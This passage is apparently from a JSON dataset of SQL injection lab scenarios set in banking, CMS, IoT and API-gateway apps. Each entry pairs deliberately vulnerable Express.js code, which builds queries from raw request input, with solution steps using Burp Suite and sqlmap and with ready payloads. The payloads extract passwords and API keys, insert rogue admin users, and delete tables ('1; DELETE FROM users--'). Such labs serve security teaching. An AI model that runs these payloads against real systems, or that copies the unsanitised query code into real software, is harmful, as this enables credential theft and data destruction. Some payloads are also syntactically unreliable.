    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction-sort', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM transactions ORDER BY ${sort}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "amount DESC, (SELECT username FROM users LIMIT 1)--",
      "timestamp ASC, (SELECT email FROM users LIMIT 1)--",
      "status DESC, (SELECT role FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in JOIN Clause",
    "Lab Description": "The CMS application joins the articles table with the authors table, but it does not sanitize user input. To solve: Exploit the JOIN clause to extract sensitive data from the authors table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the article search endpoint.",
      "Inject SQL payloads into the 'author' parameter, such as '1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any unexpected output or leaks.",
      "Use sqlmap to automate the exploitation and extract user credentials.",
      "Verify the successful extraction of user credentials from the authors table."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/article-search', (req, res) => {\n  const author = req.query.author;\n  const query = `SELECT * FROM articles JOIN authors ON articles.author_id = authors.id WHERE authors.name = ${author}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 UNION SELECT username, password FROM users--",
      "2 UNION SELECT email, password FROM users--",
      "3 UNION SELECT username, role FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in GROUP BY Clause",
    "Lab Description": "The banking portal’s transaction summary page uses user input in the GROUP BY clause for sorting. To solve: Exploit the GROUP BY clause to retrieve sensitive account information.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction summary endpoint.",
      "Inject SQL payloads into the 'group' parameter, such as 'status GROUP BY transaction_type HAVING 1=1 UNION SELECT username, password FROM users--'.",
      "Analyze the response for any unexpected data or errors.",
      "Use sqlmap to automate the exploitation and retrieve sensitive user information.",
      "Verify the successful extraction of account data from the users table."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction-summary', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT * FROM transactions GROUP BY ${group}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "status GROUP BY transaction_type HAVING 1=1 UNION SELECT username, password FROM users--",
      "amount GROUP BY transaction_type HAVING 1=1 UNION SELECT email, password FROM users--",
      "type GROUP BY transaction_type HAVING 1=1 UNION SELECT username, role FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in LIMIT Clause",
    "Lab Description": "The IoT dashboard improperly includes user input in the LIMIT clause, allowing for SQL injection. To solve: Exploit the LIMIT clause to extract sensitive device data.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device listing endpoint.",
      "Inject SQL payloads into the 'limit' parameter, such as '1, (SELECT serial_number FROM devices LIMIT 1)--'.",
      "Examine the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve device information.",
      "Verify the successful extraction of sensitive device data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-list', (req, res) => {\n  const limit = req.query.limit;\n  const query = `SELECT * FROM devices LIMIT ${limit}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1, (SELECT serial_number FROM devices LIMIT 1)--",
      "2, (SELECT device_id FROM devices LIMIT 1)--",
      "3, (SELECT ip_address FROM devices LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in INSERT Clause",
    "Lab Description": "The CMS application allows administrators to add new users through a form, but it does not properly sanitize the input in the INSERT query. To solve: Inject SQL into the INSERT clause to create a new admin user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the user creation endpoint.",
      "Inject SQL payloads into the 'username' and 'email' parameters, such as 'admin', 'password', 'admin@admin.com', 'INSERT INTO users (username, password, email) VALUES ('admin', 'password', 'admin@admin.com')--'.",
      "Examine the response for any anomalies or success indicators.",
      "Use sqlmap to automate the exploitation and create a new user.",
      "Verify the successful creation of the new admin user."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/create-user', (req, res) => {\n  const { username, password, email } = req.body;\n  const query = `INSERT INTO users (username, password, email) VALUES ('${username}', '${password}', '${email}')`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'User created' });\n  });\n});",
    "payloads": [
      "'admin', 'password', 'admin@admin.com', 'INSERT INTO users (username, password, email) VALUES ('admin', 'password', 'admin@admin.com')--",
      "'hacker', '12345', 'hacker@evil.com', 'INSERT INTO users (username, password, email) VALUES ('hacker', '12345', 'hacker@evil.com')--",
      "'attacker', 'pass123', 'attacker@evil.com', 'INSERT INTO users (username, password, email) VALUES ('attacker', 'pass123', 'attacker@evil.com')--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in LIMIT Clause",
    "Lab Description": "The API Gateway improperly uses user input in the LIMIT clause for paginating API results. To solve: Exploit the LIMIT clause to retrieve sensitive API client data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send requests to the API endpoint with the 'limit' parameter.",
      "Inject SQL payloads into the 'limit' parameter, such as '1, (SELECT api_key FROM api_clients LIMIT 1)--'.",
      "Check the response for sensitive data leaks or errors.",
      "Use sqlmap to automate the exploitation and retrieve sensitive data from the API clients.",
      "Verify the successful extraction of sensitive API credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api-endpoint', (req, res) => {\n  const limit = req.query.limit;\n  const query = `SELECT * FROM api_clients LIMIT ${limit}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1, (SELECT api_key FROM api_clients LIMIT 1)--",
      "2, (SELECT api_secret FROM api_clients LIMIT 1)--",
      "3, (SELECT api_token FROM api_clients LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in HAVING Clause",
    "Lab Description": "The banking portal’s report generation feature improperly handles user input in the HAVING clause, allowing SQL injection. To solve: Exploit the HAVING clause to retrieve sensitive user and account information.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the report generation endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'status HAVING 1=1 UNION SELECT username, account_number FROM users--'.",
      "Check the response for any sensitive information or errors.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of sensitive user information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/generate-report', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM transactions HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "status HAVING 1=1 UNION SELECT username, account_number FROM users--",
      "amount HAVING 1=1 UNION SELECT username, email FROM users--",
      "type HAVING 1=1 UNION SELECT username, password FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in ORDER BY Clause",
    "Lab Description": "The IoT dashboard improperly uses user input in the ORDER BY clause, allowing SQL injection. To solve: Exploit the ORDER BY clause to retrieve sensitive device configuration data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the IoT device endpoint.",
      "Inject SQL payloads into the 'order' parameter, such as 'name ASC, (SELECT device_config FROM devices LIMIT 1)--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve device configurations.",
      "Verify the successful extraction of device configuration data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-list', (req, res) => {\n  const order = req.query.order;\n  const query = `SELECT * FROM devices ORDER BY ${order}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "name ASC, (SELECT device_config FROM devices LIMIT 1)--",
      "model DESC, (SELECT ip_address FROM devices LIMIT 1)--",
      "status ASC, (SELECT serial_number FROM devices LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in DELETE Clause",
    "Lab Description": "The CMS allows administrators to delete posts via user input, but fails to sanitize the input properly, leaving it vulnerable to SQL injection. To solve: Inject SQL into the DELETE clause to remove data from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the post deletion endpoint.",
      "Inject SQL payloads into the 'post_id' parameter, such as '1; DELETE FROM users--'.",
      "Observe the server’s response to confirm the deletion of unauthorized data.",
      "Use sqlmap to automate the exploitation and perform the deletion.",
      "Verify the successful deletion of user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.delete('/delete-post', (req, res) => {\n  const { post_id } = req.body;\n  const query = `DELETE FROM posts WHERE id = ${post_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Post deleted' });\n  });\n});",
    "payloads": [
      "1; DELETE FROM users--",
      "2; DELETE FROM products--",
      "3; DELETE FROM orders--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in WHERE Clause",
    "Lab Description": "The banking portal filters transactions using user input in the WHERE clause, but does not sanitize it properly. To solve: Exploit the WHERE clause to retrieve sensitive account data from the transactions table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transactions endpoint.",
      "Inject SQL payloads into the 'date' parameter, such as '2021-01-01' OR '1'='1';--'.",
      "Observe the response for any unexpected data or leaks.",
      "Use sqlmap to automate the exploitation and retrieve sensitive transaction data.",
      "Verify the successful extraction of sensitive account data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const date = req.query.date;\n  const query = `SELECT * FROM transactions WHERE date = '${date}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR '1'='1';--",
      "' OR '1'='1' AND 'a'='a';--",
      "' OR 1=1; --"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in ORDER BY Clause",
    "Lab Description": "The API Gateway uses user input in the ORDER BY clause to sort API results, leaving it vulnerable to SQL injection. To solve: Exploit the ORDER BY clause to extract sensitive user credentials.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman to send a request to the API endpoint with the 'order' parameter.",
      "Inject SQL payloads into the 'order' parameter, such as 'username ASC, (SELECT password FROM users LIMIT 1)--'.",
      "Check the response for any sensitive data leaks.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api-endpoint', (req, res) => {\n  const order = req.query.order;\n  const query = `SELECT * FROM users ORDER BY ${order}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "username ASC, (SELECT password FROM users LIMIT 1)--",
      "email ASC, (SELECT password FROM users LIMIT 1)--",
      "role DESC, (SELECT email FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in LIMIT Clause",
    "Lab Description": "The IoT dashboard uses user input in the LIMIT clause to paginate results. To solve: Exploit the LIMIT clause to extract device data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device listing endpoint.",
      "Inject SQL payloads into the 'limit' parameter, such as '1, (SELECT ip_address FROM devices LIMIT 1)--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve device configurations.",
      "Verify the successful extraction of device configuration data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-list', (req, res) => {\n  const limit = req.query.limit;\n  const query = `SELECT * FROM devices LIMIT ${limit}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1, (SELECT ip_address FROM devices LIMIT 1)--",
      "2, (SELECT serial_number FROM devices LIMIT 1)--",
      "3, (SELECT device_name FROM devices LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in UPDATE Clause",
    "Lab Description": "The CMS allows administrators to update articles but does not sanitize the input used in the UPDATE clause. To solve: Inject SQL into the UPDATE clause to modify article data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the article update endpoint.",
      "Inject SQL payloads into the 'article_id' parameter, such as '1; UPDATE articles SET content='Injected content' WHERE id=1--'.",
      "Observe the response for any anomalies indicating successful injection.",
      "Use sqlmap to automate the exploitation and modify the article content.",
      "Verify the successful modification of article data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/update-article', (req, res) => {\n  const { article_id, content } = req.body;\n  const query = `UPDATE articles SET content = '${content}' WHERE id = ${article_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Article updated' });\n  });\n});",
    "payloads": [
      "1; UPDATE articles SET content='Injected content' WHERE id=1--",
      "2; UPDATE articles SET title='Injected title' WHERE id=2--",
      "3; UPDATE articles SET content='Malicious content' WHERE id=3--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in HAVING Clause",
    "Lab Description": "The banking portal uses user input in the HAVING clause of SQL queries to filter transactions. To solve: Exploit the HAVING clause to extract sensitive account information.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction report endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'status HAVING 1=1 UNION SELECT username, password FROM users--'.",
      "Observe the response for sensitive data leakage or errors.",
      "Use sqlmap to automate the exploitation and extract sensitive user credentials.",
      "Verify the successful extraction of user information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction-report', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM transactions HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "status HAVING 1=1 UNION SELECT username, password FROM users--",
      "amount HAVING 1=1 UNION SELECT username, email FROM users--",
      "type HAVING 1=1 UNION SELECT username, role FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in WHERE Clause",
    "Lab Description": "The IoT dashboard queries devices based on user input in the WHERE clause. To solve: Exploit the WHERE clause to extract sensitive device configurations.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device listing endpoint.",
      "Inject SQL payloads into the 'type' parameter, such as 'type = 'camera' OR 1=1--'.",
      "Examine the response for any leaked device information.",
      "Use sqlmap to automate the exploitation and retrieve device configurations.",
      "Verify the successful extraction of device configuration data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-list', (req, res) => {\n  const type = req.query.type;\n  const query = `SELECT * FROM devices WHERE type = '${type}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1--",
      "' OR 'a'='a'--",
      "' OR '1'='1' AND 'b'='b'--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in INSERT Clause",
    "Lab Description": "The CMS allows users to submit content for publication, but fails to sanitize input in the INSERT clause. To solve: Inject SQL into the INSERT statement to create a new admin user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the content submission endpoint.",
      "Inject SQL payloads into the 'content' parameter, such as 'test', '1; INSERT INTO users (username, password, role) VALUES ('admin', 'adminpassword', 'admin')--'.",
      "Observe the response to confirm the successful submission of the malicious request.",
      "Use sqlmap to automate the exploitation and add a new admin user.",
      "Verify the successful creation of a new admin user."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/submit-content', (req, res) => {\n  const { title, content } = req.body;\n  const query = `INSERT INTO content (title, content) VALUES ('${title}', '${content}')`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Content submitted' });\n  });\n});",
    "payloads": [
      "'1; INSERT INTO users (username, password, role) VALUES ('admin', 'adminpassword', 'admin')--",
      "'2; INSERT INTO users (username, password, role) VALUES ('malicious', 'password', 'user')--",
      "'3; INSERT INTO users (username, password, role) VALUES ('attacker', 'attackerpassword', 'user')--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in SELECT Clause",
    "Lab Description": "The banking portal allows users to check their transaction history but fails to sanitize user input in the SELECT clause. To solve: Exploit the SELECT clause to extract sensitive account data from the users table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction history endpoint.",
      "Inject SQL payloads into the 'transaction_id' parameter, such as '1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction-history', (req, res) => {\n  const transaction_id = req.query.transaction_id;\n  const query = `SELECT * FROM transactions WHERE transaction_id = ${transaction_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 UNION SELECT username, password FROM users--",
      "2 UNION SELECT username, email FROM users--",
      "3 UNION SELECT role, password FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in GROUP BY Clause",
    "Lab Description": "The IoT dashboard uses user input in the GROUP BY clause to group devices by their type. To solve: Exploit the GROUP BY clause to extract sensitive device data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device query endpoint.",
      "Inject SQL payloads into the 'group_by' parameter, such as 'type GROUP BY id HAVING 1=1 UNION SELECT ip_address FROM devices--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve device configurations.",
      "Verify the successful extraction of device data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-query', (req, res) => {\n  const group_by = req.query.group_by;\n  const query = `SELECT * FROM devices GROUP BY ${group_by}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "type GROUP BY id HAVING 1=1 UNION SELECT ip_address FROM devices--",
      "status GROUP BY id HAVING 1=1 UNION SELECT device_name FROM devices--",
      "model GROUP BY id HAVING 1=1 UNION SELECT mac_address FROM devices--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in DELETE Clause",
    "Lab Description": "The CMS allows users to delete their own content but fails to sanitize the input used in the DELETE clause. To solve: Inject SQL into the DELETE clause to delete other users' content.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the delete content endpoint.",
      "Inject SQL payloads into the 'content_id' parameter, such as '1; DELETE FROM content WHERE user_id = 2--'.",
      "Observe the response for any anomalies indicating successful injection.",
      "Use sqlmap to automate the exploitation and delete another user's content.",
      "Verify the successful deletion of unauthorized content."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/delete-content', (req, res) => {\n  const content_id = req.body.content_id;\n  const query = `DELETE FROM content WHERE id = ${content_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Content deleted' });\n  });\n});",
    "payloads": [
      "1; DELETE FROM content WHERE user_id = 2--",
      "2; DELETE FROM content WHERE user_id = 3--",
      "3; DELETE FROM content WHERE user_id = 4--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in INSERT Clause",
    "Lab Description": "The API Gateway allows users to add new records but fails to sanitize the input used in the INSERT clause. To solve: Inject SQL into the INSERT statement to add new users to the system.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the API endpoint with the 'name' and 'email' parameters.",
      "Inject SQL payloads into the 'email' parameter, such as '1); INSERT INTO users (username, password) VALUES ('attacker', 'password')--'.",
      "Check the response for any successful insertion of malicious data.",
      "Use sqlmap to automate the exploitation and insert a new user into the system.",
      "Verify the successful creation of a new user."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/add-record', (req, res) => {\n  const { name, email } = req.body;\n  const query = `INSERT INTO records (name, email) VALUES ('${name}', '${email}')`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Record added' });\n  });\n});",
    "payloads": [
      "1); INSERT INTO users (username, password) VALUES ('attacker', 'password')--",
      "2); INSERT INTO users (username, password) VALUES ('admin', 'adminpassword')--",
      "3); INSERT INTO users (username, password) VALUES ('hacker', 'hackpassword')--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in HAVING Clause",
    "Lab Description": "The banking portal allows users to filter transactions using the HAVING clause. To solve: Exploit the HAVING clause to extract sensitive transaction data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction filter endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'amount HAVING 1=1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive transaction information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction-filter', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM transactions HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "amount HAVING 1=1 UNION SELECT username, password FROM users--",
      "date HAVING 1=1 UNION SELECT email, password FROM users--",
      "status HAVING 1=1 UNION SELECT role, username FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in ORDER BY Clause",
    "Lab Description": "The IoT dashboard allows sorting of device data by user input in the ORDER BY clause. To solve: Exploit the ORDER BY clause to extract sensitive device data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device list endpoint.",
      "Inject SQL payloads into the 'order_by' parameter, such as 'id DESC, (SELECT ip_address FROM devices LIMIT 1)--'.",
      "Observe the response for any device-related data leakage.",
      "Use sqlmap to automate the exploitation and retrieve sensitive device details.",
      "Verify the successful extraction of device data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-list', (req, res) => {\n  const order_by = req.query.order_by;\n  const query = `SELECT * FROM devices ORDER BY ${order_by}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "id DESC, (SELECT ip_address FROM devices LIMIT 1)--",
      "model ASC, (SELECT serial_number FROM devices LIMIT 1)--",
      "type DESC, (SELECT mac_address FROM devices LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in WHERE Clause",
    "Lab Description": "The CMS allows administrators to view articles by category using the WHERE clause. To solve: Inject SQL into the WHERE clause to retrieve all articles in the system, including hidden ones.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the category article query endpoint.",
      "Inject SQL payloads into the 'category' parameter, such as '1 OR 1=1--'.",
      "Observe the response for any hidden or sensitive article data.",
      "Use sqlmap to automate the exploitation and extract all articles.",
      "Verify the successful extraction of articles from the system."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/category-articles', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT * FROM articles WHERE category = '${category}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1--",
      "' OR 'a'='a'--",
      "' OR '1'='1' AND 'b'='b'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in GROUP BY Clause",
    "Lab Description": "The banking portal allows users to filter account balances by grouping. To solve: Exploit the GROUP BY clause to extract sensitive user balance information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the balance report endpoint.",
      "Inject SQL payloads into the 'group_by' parameter, such as 'balance GROUP BY user_id HAVING 1=1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and extract user credentials.",
      "Verify the successful extraction of user account balance data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/balance-report', (req, res) => {\n  const group_by = req.query.group_by;\n  const query = `SELECT * FROM balances GROUP BY ${group_by}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "balance GROUP BY user_id HAVING 1=1 UNION SELECT username, password FROM users--",
      "balance GROUP BY user_id HAVING 1=1 UNION SELECT email, password FROM users--",
      "balance GROUP BY user_id HAVING 1=1 UNION SELECT role, username FROM users--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in WHERE Clause",
    "Lab Description": "The API Gateway allows users to query specific records but fails to sanitize the input in the WHERE clause. To solve: Exploit the WHERE clause to extract user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the query records endpoint.",
      "Inject SQL payloads into the 'record_id' parameter, such as '1 UNION SELECT username, password FROM users--'.",
      "Check the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/query-records', (req, res) => {\n  const record_id = req.query.record_id;\n  const query = `SELECT * FROM records WHERE id = ${record_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 UNION SELECT username, password FROM users--",
      "2 UNION SELECT username, email FROM users--",
      "3 UNION SELECT role, password FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in ORDER BY Clause",
    "Lab Description": "The banking portal allows users to sort transactions by date but fails to sanitize input in the ORDER BY clause. To solve: Exploit the ORDER BY clause to extract sensitive account data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction history endpoint.",
      "Inject SQL payloads into the 'order_by' parameter, such as 'date DESC, (SELECT username FROM users LIMIT 1)--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction-history', (req, res) => {\n  const order_by = req.query.order_by;\n  const query = `SELECT * FROM transactions ORDER BY ${order_by}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "date DESC, (SELECT username FROM users LIMIT 1)--",
      "amount ASC, (SELECT password FROM users LIMIT 1)--",
      "date ASC, (SELECT email FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in HAVING Clause",
    "Lab Description": "The IoT dashboard uses the HAVING clause to filter devices based on sensor data but fails to sanitize input. To solve: Exploit the HAVING clause to extract sensitive device data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device query endpoint.",
      "Inject SQL payloads into the 'sensor_data' parameter, such as 'sensor_value HAVING 1=1 UNION SELECT ip_address FROM devices--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve device configurations.",
      "Verify the successful extraction of device data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-query', (req, res) => {\n  const sensor_data = req.query.sensor_data;\n  const query = `SELECT * FROM devices HAVING ${sensor_data}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "sensor_value HAVING 1=1 UNION SELECT ip_address FROM devices--",
      "sensor_value HAVING 1=1 UNION SELECT mac_address FROM devices--",
      "sensor_value HAVING 1=1 UNION SELECT device_name FROM devices--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in UNION Clause",
    "Lab Description": "The CMS allows users to filter content based on tags but fails to sanitize user input in the UNION clause. To solve: Exploit the UNION clause to extract content-related data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the content filtering endpoint.",
      "Inject SQL payloads into the 'tag' parameter, such as 'tag UNION SELECT title, content FROM articles--'.",
      "Observe the response for any content data leakage.",
      "Use sqlmap to automate the exploitation and retrieve article content.",
      "Verify the successful extraction of articles from the system."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-content', (req, res) => {\n  const tag = req.query.tag;\n  const query = `SELECT * FROM content WHERE tag = '${tag}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "tag UNION SELECT title, content FROM articles--",
      "tag UNION SELECT author, content FROM articles--",
      "tag UNION SELECT id, content FROM articles--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in SELECT Clause",
    "Lab Description": "The API Gateway allows users to query record details but fails to sanitize input in the SELECT clause. To solve: Exploit the SELECT clause to extract user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the query records endpoint.",
      "Inject SQL payloads into the 'record_id' parameter, such as '1 UNION SELECT username, password FROM users--'.",
      "Check the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/query-records', (req, res) => {\n  const record_id = req.query.record_id;\n  const query = `SELECT * FROM records WHERE id = ${record_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
